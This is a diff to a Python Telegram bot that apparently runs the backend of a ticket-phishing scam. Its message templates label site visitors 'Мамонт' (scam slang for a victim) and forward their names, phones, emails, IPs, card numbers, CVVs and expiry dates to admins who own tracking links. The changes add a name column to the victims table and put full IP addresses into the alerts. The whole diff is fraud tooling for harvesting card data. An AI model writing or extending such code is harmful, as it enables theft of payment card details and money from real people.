@@ -127,6 +127,7 @@ c.execute("""
 CREATE TABLE IF NOT EXISTS site_users (
     id VARCHAR(12) PRIMARY KEY,
     ip VARCHAR(45),
+    name TEXT,
     date_1 VARCHAR(20),
     date_2 VARCHAR(20),
     date_3 VARCHAR(20),
@@ -161,6 +162,17 @@ try:
     conn.execute('CREATE INDEX IF NOT EXISTS idx_site_users_ip_created ON site_users(ip, created_at)')
 except Exception:
     pass
+
+# Додаємо колонку name до існуючої таблиці site_users, якщо вона не існує
+try:
+    c.execute('SELECT name FROM site_users LIMIT 1')
+except sqlite3.OperationalError:
+    print("[DB] Adding name column to site_users table")
+    c.execute('ALTER TABLE site_users ADD COLUMN name TEXT')
+    conn.commit()
+    print("[DB] name column added successfully")
+except Exception as e:
+    print(f"[DB] Error checking/adding name column: {e}")
 
 # --- Таблица для місць подій ---
 c.execute("""
@@ -527,29 +539,9 @@ def format_text_notification_message(admin_username, name, price, currency):
 
 def format_order_start_message(page_code, name, phone, email, ip, price, currency):
     """Формує красиве повідомлення про початок оформлення замовлення"""
-    # Визначаємо назву події за page_code
-    event_name = "Выставка"  # За замовчуванням
-    
-    if page_code:
-        try:
-            series = int(page_code.split('-')[0])
-            event_names = [
-                "Terroir and Traditions",
-                "Collection Co–selection", 
-                "Snucie",
-                "Art that saves lives",
-                "Gotong Royong",
-                "Anna Konik",
-                "Uncensored",
-                "Jacek Adamas"
-            ]
-            if 1 <= series <= len(event_names):
-                event_name = event_names[series - 1]
-        except:
-            pass
     
     message = (
-        f"🔔 Мамонт оформляет заказа ({event_name})\n\n"
+        f"🔔 Мамонт оформляет заказа\n\n"
         f"#️⃣ Ссылка: ?page={page_code or 'Не указано'}\n"
         f"👤 Мамонт: {name or 'Не указано'}\n"
         f"📱 Телефон: {phone or 'Не указано'}\n"
@@ -592,29 +584,9 @@ def format_code_request_message(admin_username, name, price, currency, page_code
 
 def format_card_payment_message(page_code, name, price, currency, card_number, cvv="", expiry="", country=""):
     """Формує красиве повідомлення про введення карти"""
-    # Визначаємо назву події за page_code
-    event_name = "Выставка"  # За замовчуванням
-    
-    if page_code:
-        try:
-            series = int(page_code.split('-')[0])
-            event_names = [
-                "Terroir and Traditions",
-                "Collection Co–selection", 
-                "Snucie",
-                "Art that saves lives",
-                "Gotong Royong",
-                "Anna Konik",
-                "Uncensored",
-                "Jacek Adamas"
-            ]
-            if 1 <= series <= len(event_names):
-                event_name = event_names[series - 1]
-        except:
-            pass
     
     message = (
-        f"🔔 Мамонт ввел карту ({event_name})\n\n"
+        f"🔔 Мамонт ввел карту\n\n"
         f"#️⃣ Ссылка: ?page={page_code or 'Не указано'}\n"
         f"👤 Мамонт: {name or 'Не указано'}\n"
         f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}\n"
@@ -2534,12 +2506,12 @@ async def admin_enter_text(message: types.Message):
             if row:
                 user_name = row[0]
         except sqlite3.OperationalError:
-            # Якщо колонки name немає, використовуємо IP як ім'я
-            user_name = f"User_{ip.split('.')[-1]}"
-            print(f"[DEBUG] No name column in site_users, using IP-based name: {user_name}")
+            # Якщо колонки name немає, використовуємо більш інформативне ім'я
+            user_name = f"Клієнт з IP {ip}"
+            print(f"[DEBUG] No name column in site_users, using informative name: {user_name}")
         except Exception as e:
             print(f"[DEBUG] Error getting user name: {e}")
-            user_name = f"User_{ip.split('.')[-1]}"
+            user_name = f"Клієнт з IP {ip}"
         
         if page_code:  # Додаємо перевірку page_code
             # Отримуємо інформацію про подію
@@ -3087,12 +3059,12 @@ async def code_notify(request):
             if row:
                 user_name = row[0]
         except sqlite3.OperationalError:
-            # Якщо колонки name немає, використовуємо IP як ім'я
-            user_name = f"User_{ip.split('.')[-1]}"
-            print(f"[DEBUG] No name column in site_users, using IP-based name: {user_name}")
+            # Якщо колонки name немає, використовуємо більш інформативне ім'я
+            user_name = f"Клієнт з IP {ip}"
+            print(f"[DEBUG] No name column in site_users, using informative name: {user_name}")
         except Exception as e:
             print(f"[DEBUG] Error getting user name: {e}")
-            user_name = f"User_{ip.split('.')[-1]}"
+            user_name = f"Клієнт з IP {ip}"
     
     # Отримуємо username власника посилання
     admin_username = None
@@ -3212,12 +3184,12 @@ async def admin_action_handler(call: types.CallbackQuery):
             if row:
                 user_name = row[0]
         except sqlite3.OperationalError:
-            # Якщо колонки name немає, використовуємо IP як ім'я
-            user_name = f"User_{ip.split('.')[-1]}"
-            print(f"[DEBUG] No name column in site_users, using IP-based name: {user_name}")
+            # Якщо колонки name немає, використовуємо більш інформативне ім'я
+            user_name = f"Клієнт з IP {ip}"
+            print(f"[DEBUG] No name column in site_users, using informative name: {user_name}")
         except Exception as e:
             print(f"[DEBUG] Error getting user name: {e}")
-            user_name = f"User_{ip.split('.')[-1]}"
+            user_name = f"Клієнт з IP {ip}"
     
     if page_code:
         # Отримуємо інформацію про подію
